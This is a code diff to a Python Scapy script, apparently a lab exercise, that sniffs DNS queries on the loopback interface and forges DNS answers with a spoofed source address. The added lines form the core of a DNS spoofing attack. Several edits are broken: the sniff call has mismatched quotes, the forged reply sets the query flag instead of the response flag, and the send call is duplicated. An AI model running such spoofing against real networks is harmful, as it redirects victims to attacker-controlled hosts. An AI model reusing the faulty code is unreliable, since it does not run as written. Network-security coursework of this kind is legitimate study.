@@ -54,7 +54,13 @@ def dns_callback(packet, extra_args):
 		print("Dest Port: " + str(packet[UDP].dport))
 		print("Requested website: " + str(packet.qd.qname))
 		print()
-		response = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport)/DNSRR(rdata=extra_args[0], rrname=packet.qd.qname)
+		dnsrr = DNSRR(rdata=extra_args[0], rrname=HOSTNAME)
+		response_dns = DNS(id=packet[DNS].id, an=dnsrr, qr=0, aa=1)
+		response = IP(src=extra_args[0], dst=packet[IP].src)/UDP(sport=53, dport=packet[UDP].sport)/DNS()
+		response[DNS] = response_dns
+		send(response)
+
+
 		send(response)
 
 
@@ -70,7 +76,7 @@ def sniff_and_spoof(source_ip):
 
 	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
 	# and the socket you created as extra callback arguments.
-	sniff(iface="lo", prn=lambda p: dns_callback(p, (source_ip, s)))
+	sniff(filter="iface="lo", prn=lambda p: dns_callback(p, (source_ip, s)))
 
 
 
